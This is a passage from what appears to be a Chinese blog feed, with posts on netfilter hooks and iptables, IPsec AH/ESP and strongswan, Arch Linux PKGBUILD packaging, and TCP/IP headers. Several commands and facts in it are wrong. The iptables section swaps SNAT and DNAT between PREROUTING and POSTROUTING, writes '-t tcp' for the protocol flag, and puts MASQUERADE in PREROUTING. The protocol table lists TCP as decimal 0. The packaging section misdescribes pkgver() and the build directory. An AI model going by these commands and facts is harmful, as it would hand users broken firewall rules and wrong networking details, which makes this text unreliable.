skb_dst(skb)-&gt;dev,</span><br><span class="line">       dst_output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="5-第五个挂接点-NF-INET-POST-ROUTING"><a href="#5-第五个挂接点-NF-INET-POST-ROUTING" class="headerlink" title="5.第五个挂接点(NF_INET_POST_ROUTING)"></a>5.第五个挂接点(NF_INET_POST_ROUTING)</h5><p>数据在执行路由选择之后即将进入链路层的时候执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ip_output</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> sock *sk, <span class="keyword">struct</span> sk_buff *skb)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">dev</span> =</span> skb_dst(skb)-&gt;dev, *indev = skb-&gt;dev;</span><br><span class="line"></span><br><span class="line">IP_UPD_PO_STATS(net, IPSTATS_MIB_OUT, skb-&gt;len);</span><br><span class="line"></span><br><span class="line">skb-&gt;dev = dev;</span><br><span class="line">skb-&gt;protocol = htons(ETH_P_IP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING,</span><br><span class="line">    net, sk, skb, indev, dev,</span><br><span class="line">    ip_finish_output,</span><br><span class="line">    !(IPCB(skb)-&gt;flags &amp; IPSKB_REROUTED));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-流量在netfilter中的走向"><a href="#2-流量在netfilter中的走向" class="headerlink" title="2.流量在netfilter中的走向"></a>2.流量在netfilter中的走向</h3><p><img src="/images/iptables.png" alt="iptables"></p><h3 id="3-iptables的结构"><a href="#3-iptables的结构" class="headerlink" title="3.iptables的结构"></a>3.iptables的结构</h3><h4 id="1-表"><a href="#1-表" class="headerlink" title="1.表"></a>1.表</h4><ul><li><p>raw</p><p>用于赶上连接之前处理数据包,比如在数据流量大的时候,可以定义某条规则不进入跟踪链,提高iptables效率</p></li><li><p>mangle</p><p>用于修改数据包,如TOS,QOS</p></li><li><p>nat</p><p>用于数据包的网络地址转换</p></li><li><p>filter</p><p>用于数据包的过滤</p></li></ul><h4 id="2-链"><a href="#2-链" class="headerlink" title="2.链"></a>2.链</h4><ul><li><p>PREROUTING</p><p>用于路由器前转换(如源地址转换(SNAT))</p></li><li><p>INPUT</p><p>用于入站流量处理</p></li><li><p>FORWARD</p><p>用于转发流量处理</p></li><li><p>OUTPUT</p><p>用于出战流量处理</p></li><li><p>POSTROUTING</p><p>用于路由后转换(如目标地址转换(DNAT))</p></li></ul><h3 id="4-基本用法"><a href="#4-基本用法" class="headerlink" title="4.基本用法"></a>4.基本用法</h3><p>命令格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">iptables -t [table] COMMAND(chains) -p [protocol] -s [<span class="built_in">source</span> ip address] -d [destination ip address] ..... -j ACTION</span><br><span class="line">-R/I/A(修改/插入/追加)</span><br><span class="line">-t 指定表</span><br><span class="line">-p 指定协议（tcp/udp/icmp)</span><br><span class="line">-s 指定源ip地址(ip/mask)</span><br><span class="line">-d 指定目标ip地址</span><br><span class="line">--dport 指定目标端口</span><br><span class="line">--sport 指定源端口</span><br><span class="line">-j 指定处理类型(DROP/REJECT/ACCEPT/REDIRECT/MASQUERADE)(丢弃,丢弃并回应,允许,重定向,伪装源ip地址)</span><br><span class="line">-m 指定扩展类型(multiport/state/owner)</span><br><span class="line">--state 指定连接状态(NEW,ESTABLISHED)</span><br><span class="line">--tcp-flags(SYN,ACK,PSH,FIN,)</span><br><span class="line">--icmp-type(指定icmp的标志位,echo-request,echo-reply)</span><br><span class="line">-i 指定入站网卡</span><br><span class="line">-o 指定出战网卡</span><br></pre></td></tr></table></figure><h5 id="1-配置链的默认策略"><a href="#1-配置链的默认策略" class="headerlink" title="1.配置链的默认策略"></a>1.配置链的默认策略</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t filter -P INPUT DROP/ACCEPT</span><br></pre></td></tr></table></figure><h5 id="2-配置数据包过滤"><a href="#2-配置数据包过滤" class="headerlink" title="2.配置数据包过滤"></a>2.配置数据包过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置</span></span><br><span class="line">iptables -t filter -I INPUT -t tcp -s 0.0.0.0/0 -d 0.0.0.0/0 --dport 80 -j DROP</span><br></pre></td></tr></table></figure><h5 id="3-配置nat"><a href="#3-配置nat" class="headerlink" title="3.配置nat"></a>3.配置nat</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置源地址转换</span></span><br><span class="line">iptables -t nat -I PREROUTING -s 0.0.0.0/0 -d 0.0.0.0 -j MASQUERADE</span><br><span class="line"><span class="comment">#配置目标地址转换</span></span><br><span class="line">iptables -t nat -I POSTROUTING -s 0.0.0.0/0 -d 0.0.0.0/0 -j DNAT --to-destination 192.168.50.1/24</span><br></pre></td></tr></table></figure><h5 id="4-配置保存iptables规则"><a href="#4-配置保存iptables规则" class="headerlink" title="4.配置保存iptables规则"></a>4.配置保存iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-save &gt; ./iptables.txt</span><br></pre></td></tr></table></figure><h5 id="5-配置导入iptables规则"><a href="#5-配置导入iptables规则" class="headerlink" title="5.配置导入iptables规则"></a>5.配置导入iptables规则</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables-restore &lt; ./iptables.txt</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>iptable是linux中控制流量进出的非常有效的工具,在了解iptables的同时可以非常深刻的了解linux中接收流量后流量的走向。</p><p>参考:<a href="https://zhuanlan.zhihu.com/p/507786224">https://zhuanlan.zhihu.com/p/507786224</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件源码分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPSEC VPN</title>
      <link href="/2022/04/27/IPSecVPN/"/>
      <url>/2022/04/27/IPSecVPN/</url>
      
        <content type="html"><![CDATA[<h2 id="IPSecVPN"><a href="#IPSecVPN" class="headerlink" title="IPSecVPN"></a>IPSecVPN</h2><h4 id="1-什么是IPSEC"><a href="#1-什么是IPSEC" class="headerlink" title="1.什么是IPSEC?"></a>1.什么是IPSEC?</h4><p>互联网安全协议(Internet Protocol Security)是一个协议包,透过对IP协议的分组进行加密和认证的网络传输协议族(一些相互关联的协议的集合)</p><p>IPsec主要由以下<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">协议</a>组成[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2411-1">1]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4308-2">2]</a>：</p><ol><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E8%AE%A4%E8%AF%81%E5%A4%B4%EF%BC%88AH%EF%BC%89">认证头（AH）</a>，为IP<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%8A%A5">数据报</a>提供无连接<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7">数据完整性</a>、<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81&action=edit&redlink=1">消息认证</a>以及防<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>保护[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2402-3">3]</a>[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc4302-4">4]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/zh-cn/IPsec#%E5%B0%81%E8%A3%85%E5%AE%89%E5%85%A8%E8%BD%BD%E8%8D%B7%EF%BC%88ESP%EF%BC%89">封装安全载荷（ESP）</a>，提供机密性、数据源认证、无连接完整性、防重放和有限的传输流（traffic-flow）机密性[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2406-5">5]</a>；</p></li><li><p><a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%9A%9B%E7%B6%B2%E8%B7%AF%E9%87%91%E9%91%B0%E4%BA%A4%E6%8F%9B">因特网密钥交换</a>（英语： <a href="https://zh.wikipedia.org/w/index.php?title=Internet_Key_Exchange&action=edit&redlink=1">Internet Key Exchange</a> ，简称IKE或IKEv2），为 AH、ESP 操作所需的 <a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E9%97%9C%E8%81%AF">安全关联（SA）</a> 提供算法、数据包和密钥参数[<a href="https://zh.wikipedia.org/zh-cn/IPsec#cite_note-rfc2409_sec1-6">6]</a>。</p><p>IPsec协议工作在<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">OSI模型</a>的第三层，使其在单独使用时适于保护基于<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>或<a href="https://zh.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">UDP</a>的协议（如<a href="https://zh.wikipedia.org/wiki/%E5%AE%89%E5%85%A8%E5%A5%97%E6%8E%A5%E5%AD%90%E5%B1%82">安全套接子层</a>（<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>）就不能保护UDP层的通信流）。这就意味着，与传输层或更高层的协议相比，IPsec协议必须处理可靠性和分片的问题，这同时也增加了它的复杂性和处理开销。相对而言，<a href="https://zh.wikipedia.org/wiki/SSL">SSL</a>&#x2F;<a href="https://zh.wikipedia.org/wiki/TLS">TLS</a>依靠更高层的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">TCP</a>（OSI的第四层）来管理可靠性和分片。</p></li></ol><h3 id="2-认证头-AH-Authentication-Header-协议号51"><a href="#2-认证头-AH-Authentication-Header-协议号51" class="headerlink" title="2.认证头(AH(Authentication Header))(协议号51)"></a>2.认证头(AH(Authentication Header))(协议号51)</h3><p><strong>认证头</strong>（Authentication Header，<strong>AH</strong>）被用来保证被传输分组的完整性和可靠性。此外，它还保护不受<a href="https://zh.wikipedia.org/wiki/%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB">重放攻击</a>。认证头试图保护IP数据报的所有字段，那些在传输IP分组的过程中要发生变化的字段就只能被排除在外。当认证头使用非对称数字签名算法（如RSA）时，可以提供不可否认性<br><img src="/images/AH%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="认证头">字段含义：</p><ul><li>下一个头：标识被传送数据所属的协议。</li><li>载荷长度：认证头包的大小。</li><li>保留：为将来的应用保留（目前都置为0）。</li><li>安全参数索引：与IP地址一同用来标识安全参数。</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>认证数据：包含了认证当前包所必须的数据。</li></ul><p>AH协议会对数据和ip包头进行校验,因此AH协议不能穿透NAT,并且AH协议不会对数据进行加密,只会对数据进行校验</p><h3 id="3-封装载荷-协议号50"><a href="#3-封装载荷-协议号50" class="headerlink" title="3.封装载荷(协议号50)"></a>3.封装载荷(协议号50)</h3><p><strong>封装安全载荷</strong>（Encapsulating Security Payload，<strong>ESP</strong>）协议对分组提供了源可靠性、完整性和保密性的支持。与AH头不同的是，IP分组头部不被包括在内。</p><p><img src="/images/esp%E5%8C%85%E7%BB%93%E6%9E%84.png" alt="封装载荷"></p><ul><li>安全参数索引：与IP地址一同用来标识安全参数</li><li>串行号：单调递增的数值，用来防止重放攻击。</li><li>载荷数据：如果没使用ESP的加密功能，则载荷数据域的内容是“下一个头”所指示的数据；如果使用了ESP的加密功能，则使用加密载荷数据和ESP尾部数据所得的密文作为payload data.</li><li>填充：某些块加密算法用此将数据填充至块的长度。</li><li>填充长度：以位为单位的填充数据的长度。</li><li>下一个头：标识载荷中封装的数据所属的协议。</li><li>认证数据：又叫做完整性校验值（ICV）。包含了认证当前包所必须的数据。</li></ul><p>ESP协议不校验ip包头,并且提供数据包的加密和校验。</p><h3 id="4-IPsecVPN搭建"><a href="#4-IPsecVPN搭建" class="headerlink" title="4.IPsecVPN搭建"></a>4.IPsecVPN搭建</h3><p>ipsecvpn实现有很多软件包的实现，这里基于archlinux使用strongswan实现ipsecvpn的搭建<br>1.安装ipsecvpn</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S strongswan</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Archlinux打包软件包步骤</title>
      <link href="/2022/04/24/Archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/"/>
      <url>/2022/04/24/Archlinux%E6%89%93%E5%8C%85%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%AD%A5%E9%AA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Archlinux打包软件包步骤"><a href="#Archlinux打包软件包步骤" class="headerlink" title="Archlinux打包软件包步骤"></a>Archlinux打包软件包步骤</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>archlinux中的软件包都是通过makepkg来打包的,makepkg工具会读取一个PKGBUILD的脚本,按照脚本里面的规则自动构建软件包,打包完成后会在打包的目录下面生成一个.pkg.tar.zst的文件,这个文件可以直接使用pacman包管理工具安装(pacman -U name.pkg.tar.zst)</p><h3 id="2-打包前的准备"><a href="#2-打包前的准备" class="headerlink" title="2.打包前的准备"></a>2.打包前的准备</h3><p>首先要准本打包的工具,一般有base-devel这个软件包就足够了,通常makepkg在打包的过程中主要做以下几个步骤:</p><ul><li><p>1.检查软件包的相关依赖是否已经安装</p></li><li><p>2.从指定的服务器下载软件包对应的源代码</p></li><li><p>3.解压对应的源代码</p></li><li><p>4.编译源码,并将其安装在伪root目录下面</p></li><li><p>5.生成包的元数据(metadata)</p></li><li><p>6.将伪root环境打包为一个tar文件后用zstd将其压缩</p></li><li><p>7.将生成的打包好的软件保存至配置好的目录下面</p><h3 id="3-PKGBUILD写法"><a href="#3-PKGBUILD写法" class="headerlink" title="3.PKGBUILD写法"></a>3.PKGBUILD写法</h3><p>PKGBUILD脚本中一般有以下几个变量和函数</p><ul><li>变量</li></ul><p>1.pkgdesc</p><p>软件包的描述信息</p><p>2.pkgdir</p><p>软件包存储的目录</p><p>3.pkgname</p><p>软件包的名称</p><p>4.pkgver</p><p>软件包的版本</p><p>5.source</p><p>软件的源码</p><p>6.arch</p><p>软件适用的架构,如果和平台无关可以直接填写any</p><p>7.license</p><p>软件的许可证</p><p>8.depens</p><p>软件的依赖</p><p>9.srcdir</p><p>软件源码的目录</p><ul><li>函数</li></ul><p>1.prepare()</p><p>此函数会执行用于预处理源文件执行的命令,例如patch,此函数执行在build之前</p><p>2.pkgver()</p><p>此函数会抓取并解压源文件,执行完prepare函数后执行此函数</p><p>3.build()</p><p>此函数第一步先进入源代码的目录下,makepkg会在执行build函数之前更改当前目录为pkgdir目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="variable">$pkgdir</span>/<span class="variable">$pkgname</span>-<span class="variable">$pkgver</span>&quot;</span></span><br><span class="line">./configure --prefix=/usr</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>4.package()</p><p>此函数会将编译好的文件安装值伪root环境下面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make DESTDIR=<span class="string">&quot;<span class="variable">$pkgdir</span>/&quot;</span> install </span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux软件打包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP协议</title>
      <link href="/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/04/18/TCP-IP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-IP协议"><a href="#TCP-IP协议" class="headerlink" title="TCP&#x2F;IP协议"></a>TCP&#x2F;IP协议</h1><h4 id="1-什么是TCP-IP协议"><a href="#1-什么是TCP-IP协议" class="headerlink" title="1.什么是TCP&#x2F;IP协议?"></a>1.什么是TCP&#x2F;IP协议?</h4><p>TCP&#x2F;IP（Transmission Control Protocol&#x2F;Internet Protocol，传输控制协议&#x2F;网际协议）是指能够在多个不同网络间实现信息传输,网络通信的协议簇。TCP&#x2F;IP协议不仅仅指的是TCP 和IP两个协议，而是指一个由FTP、SMTP、TCP、UDP、IP等协议构成的协议簇， 只是因为在TCP&#x2F;IP协议中TCP协议和IP协议最具代表性，所以被称为TCP&#x2F;IP协议。</p><h4 id="2-TCP-IP协议的具体含义"><a href="#2-TCP-IP协议的具体含义" class="headerlink" title="2.TCP&#x2F;IP协议的具体含义"></a>2.TCP&#x2F;IP协议的具体含义</h4><p>从字面意义上讲，有人可能会认为 TCP&#x2F;IP 是指 TCP 和 IP 两种协议。实际生活当中有时也确实就是指这两种协议。然而在很多情况下，它只是利用 IP 进行通信时所必须用到的协议群的统称。具体来说，IP 或 ICMP、TCP 或 UDP、TELNET 或 FTP、以及 HTTP 等都属于 TCP&#x2F;IP 协议。他们与 TCP 或 IP 的关系紧密，是互联网必不可少的组成部分。TCP&#x2F;IP 一词泛指这些协议，因此，有时也称 TCP&#x2F;IP 为网际协议群。</p><p>互联网进行通信时，需要相应的网络协议，TCP&#x2F;IP 原本就是为使用互联网而开发制定的协议族。因此，互联网的协议就是 TCP&#x2F;IP，TCP&#x2F;IP 就是互联网的协议。</p><table><thead><tr><th>OSI七层模型</th><th>TCP&#x2F;IP模型</th><th>功能</th><th>TCP&#x2F;IP协议族</th></tr></thead><tbody><tr><td>应用层</td><td>应用层</td><td>提供即时通讯,文件传输,虚拟终端等</td><td>HTTP,FTP,TFTP,DNS,SMTP,POP3</td></tr><tr><td>表示层</td><td></td><td>提供数据的编码和数据的加密</td><td></td></tr><tr><td>会话层</td><td></td><td>建立进程间的联系</td><td></td></tr><tr><td>传输层</td><td>传输层</td><td>提供进程到进程,端对端的通信</td><td>TCP、UDP</td></tr><tr><td>网络层</td><td>网络层</td><td>实现数据包的路由</td><td>IP ICMP IGMP BGP RIP OSPF</td></tr><tr><td>数据链路层</td><td>数据链路层</td><td>提供差错校验</td><td>ARP RARP PPP</td></tr><tr><td>物理层</td><td></td><td>承载上层数据</td><td></td></tr></tbody></table><h4 id="3-网络数据格式"><a href="#3-网络数据格式" class="headerlink" title="3.网络数据格式"></a>3.网络数据格式</h4><p><img src="/images/packet.jpeg" alt=" 网络数据的封装"></p><p>网络中传输的数据包含两部分,一部分为协议头,存储了该层必要的控制信息,而且每一层都会将上一层的控制信息和上一层的数据部分作为本层的数据部分</p><h4 id="4-以太网协议"><a href="#4-以太网协议" class="headerlink" title="4.以太网协议"></a>4.以太网协议</h4><p><strong>以太网</strong>（英语：Ethernet）是一种<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a><a href="https://zh.wikipedia.org/wiki/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>技术。<a href="https://zh.wikipedia.org/wiki/IEEE">IEEE</a>组织的IEEE 802.3标准制定了以太网的技术标准，它规定了包括<a href="https://zh.wikipedia.org/wiki/OSI%E6%A8%A1%E5%9E%8B">物理层</a>的连线、电子信号和<a href="https://zh.wikipedia.org/wiki/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6">介质访问控制</a>的内容。以太网是目前应用最普遍的局域网技术，取代了其他局域网标准如<a href="https://zh.wikipedia.org/wiki/%E4%BB%A4%E7%89%8C%E7%8E%AF">令牌环</a>、<a href="https://zh.wikipedia.org/wiki/FDDI">FDDI</a>和<a href="https://zh.wikipedia.org/w/index.php?title=ARCNET&action=edit&redlink=1">ARCNET</a>。</p><p>以太网的标准<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E7%B5%A1%E6%8B%93%E6%92%B2">拓扑</a>结构为<a href="https://zh.wikipedia.org/wiki/%E5%8C%AF%E6%B5%81%E6%8E%92%E6%8B%93%E6%92%B2">总线型拓扑</a>，但目前的快速以太网（<a href="https://zh.wikipedia.org/w/index.php?title=100BASE-T&action=edit&redlink=1">100BASE-T</a>、<a href="https://zh.wikipedia.org/wiki/1000BASE-T">1000BASE-T</a>标准）为了减少冲突，将能提高的网络速度和使用效率最大化，使用<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8">交换机</a>（Switch hub）来进行网络连接和组织。如此一来，以太网的拓扑结构就成了<a href="https://zh.wikipedia.org/wiki/%E6%98%9F%E5%9E%8B%E7%BD%91">星型</a>；但在逻辑上，以太网仍然使用总线型拓扑和<a href="https://zh.wikipedia.org/wiki/CSMA/CD">CSMA&#x2F;CD</a>（Carrier Sense Multiple Access&#x2F;Collision Detection，即载波多重访问&#x2F;碰撞侦测）的总线技术。</p><h5 id="1-以太网包头"><a href="#1-以太网包头" class="headerlink" title="1.以太网包头"></a>1.以太网包头</h5><ul><li><p>1.目标MAC地址(48bit)</p><p>数据帧目标主机的MAC地址</p></li><li><p>2.源MAC地址(48bit)</p><p>数据帧发送端主机的MAC地址</p></li><li><p>3.上层协议类型(16bit)</p><p>用于表示上层的协议如(0806表示arp，0800表示ip)</p></li><li><p>4.FCS帧校验序列(32bit)</p><p>数据帧的校验码,用于校验数据帧的完整性</p></li></ul><h4 id="5-IP协议"><a href="#5-IP协议" class="headerlink" title="5.IP协议"></a>5.IP协议</h4><p><strong>网际协议</strong>（英语：Internet Protocol，缩写：<strong>IP</strong>），又称<strong>互联网协议</strong>，是用于<a href="https://zh.wikipedia.org/wiki/%E5%B0%81%E5%8C%85%E4%BA%A4%E6%8F%9B">分组交换</a>数据网络的协议。</p><p>IP是在<a href="https://zh.wikipedia.org/wiki/TCP/IP%E5%8D%8F%E8%AE%AE%E6%97%8F">TCP&#x2F;IP协议族</a>中<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E5%B1%82">网络层</a>的主要协议，任务仅仅是根据源主机和目的主机的地址来传送数据。为此目的，IP定义了寻址方法和数据报的封装结构。第一个架构的主要版本为<a href="https://zh.wikipedia.org/wiki/IPv4">IPv4</a>，目前仍然是广泛使用的互联网协议，尽管世界各地正在积极部署<a href="https://zh.wikipedia.org/wiki/IPv6">IPv6</a>。</p><h5 id="1-IP包头"><a href="#1-IP包头" class="headerlink" title="1.IP包头"></a>1.IP包头</h5><ul><li><p>1.版本号(4bit)</p><p>0100为IPV4,0110为IPV6</p></li><li><p>2.首部长度(4bit)</p><p>指明整个ip包头的长度,ip包头的长度介于20-60个字节之间,因此此字段的单位为四字节</p></li><li><p>3.服务类型(8bit)</p><p>服务器类型（TOS）字段，其中前3个bit表示优先权（现在已经忽略该字段），随后的4个bit表示服务类型，按顺序分别表示为最小时延、最大吞吐量、最高可靠性、最小费用四种。这个4个bit中最多只能有1个bit置位，如果全是0则表示一般服务。最有1个bit为未用位，必须置0</p></li><li><p>4.总长度(16bit)</p><p>表示整个ip包的总字节数</p></li><li><p>5.标识符(16bit)</p><p>16bit的标识字段唯一的标识主机发送的每一份数据报，由于数据在发送时会进行分片,到达目标主机后会将数据包分片进行重组,此标识符用于区别该分片属于哪个数据包,由主机生成具有唯一性。通常每发送一份报文该值加1。该值在数据包分片时，会复制到每一个片中。所以在重组分片包的时候会观察该值，把该值相同的分片收集到一起重组，后面会继续讨论分片。</p></li><li><p>6.标志位(3bit)</p><p>3bit的标识字段每一位都有特定的含义，该字段主要用来分片和重组。第1个bit为保留位（Reserved Bit），一般置位0。第2个bit为不分片位（Don’t Fragment），该位在置1时表示不分片。第3个bit为更多片位（More Fragment），该位表示后面是否还有更多的分片，置位1时表示后面还有，所以除了最后一片报文，其他分片报文该位全部置1。</p></li><li><p>7.片偏移(13bit)</p><p>用于表明次数据包首部偏移数据包真正首部多少个字节,假如发送一个原始数据包1461个byte,那么第一个数据包分片为0,第二个数据包分片为1460</p></li><li><p>8.ttl值(8bit)</p><p>用于表示最多经过的路由器的数量,防止数据包在互联网上一直转发,消耗网络资源,ttl没经过一个路由器就会减1,当ttl减小到0时路由器就会将数据包丢弃,并向源主机回应一个icmp报文,表示ttl超时</p></li><li><p>9.协议号(8bit)</p><p>用于表示上层的协议如</p><table><thead><tr><th align="center">十进制</th><th align="center">十六进制</th><th align="center">关键字</th><th align="center">协议</th><th align="center">引用</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0x06</td><td align="center">TCP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE"> 传输控制协议（TCP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc793">RFC 793</a></td></tr><tr><td align="center">1</td><td align="center">0x01</td><td align="center">ICMP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A7%E5%88%B6%E6%B6%88%E6%81%AF%E5%8D%8F%E8%AE%AE">互联网控制消息协议（ICMP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc792">RFC 792</a></td></tr><tr><td align="center">17</td><td align="center">0x11</td><td align="center">UDP</td><td align="center"><a href="https://zh.m.wikipedia.org/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE">用户数据报协议（UDP）</a></td><td align="center"><a href="https://tools.ietf.org/html/rfc768">RFC 768</a></td></tr></tbody></table></li><li><p>10.首部校验和(16bit)</p><p>用于校验ip首部是否正确,不对ip包的数据部分进行校验</p><p>计算方法：首先把首部中的该字段全部置0，然后对首部中的每个16bit进行反码求和，得到的值就是该字段的值，填入后。将该数据包发给接收端后，接收端将进行相同的操作，对每个16bit进行反码求和（此时首部校验和字段为非0字段），所以计算后的值若为全1表示正确，否则表示收到的数据包不正确，动作为丢弃。</p></li><li><p>11.源IP地址</p><p>发送端的ip地址</p></li><li><p>12.目标IP地址</p><p>接受方的ip地址</p></li><li><p>13.可选项</p></li></ul><h5 id="2-IP地址"><a href="#2-IP地址" class="headerlink" title="2.IP地址"></a>2.IP地址</h5><p>IP地址标识着网络中一个系统的位置。每个IP地址都是由两部分组成：网络号和主机号。网络号标识一个物理的网络，同一个网络上所有的主机需要同一个网络号，该号在整个互联网是唯一的；主机号是网络中的一个工作端、服务器、路由器其他TCP&#x2F;IP主机。对于一个网络号来说主机号是唯一的。每个TCP&#x2F;IP主机由一个逻辑IP地址确定。</p><p>IP地址有两种表示方法：二进制表示、点分十进制表示。<br>每个IP地址为4个字节，由4个8位域组成，称之为8位体。</p><h5 id="3-IP地址划分"><a href="#3-IP地址划分" class="headerlink" title="3.IP地址划分"></a>3.IP地址划分</h5><p>IP地址划分为5类</p><ul><li>1.A类地址（ 0.0.0.0 - 127.255.255.255 ）以”0”头，网络段长度为8位，其中可变部分的长度为7位；主机段长度为24位。7位的可变网络段可识别2^7&#x3D;128 (0~127)个网络，其中0和127另有用途，故只有126个可用的A类网络地址。另外，主机位全”0”代表网络本身，全”1”代表网内广播，因此一个A类网络地址可识别的可分配地址有 2^24-2 个。</li><li>2.B类地址（ 128.0.0.0 - 191.255.255.255 ）以”10”开头，网络段长度为16位，可变部分的长度为14位；主机段长度为16位。14位的可变网络段可以识别的网络数为 2^14 个。另外，主机位全”0”与全”1”功能同A类地址，因此一个B类网络可以分配地址有 2^16-2 个。</li><li>3.C类地址（ 192.0.0.0 - 223.255.255.255 ）以”110”开头，网络段长度为24位，其中可变部分的长度为21位；主机段长度为8位。21位的可变网络段可以识别的网络数为 2^21 个。可分配的主机地址是 2^8-2 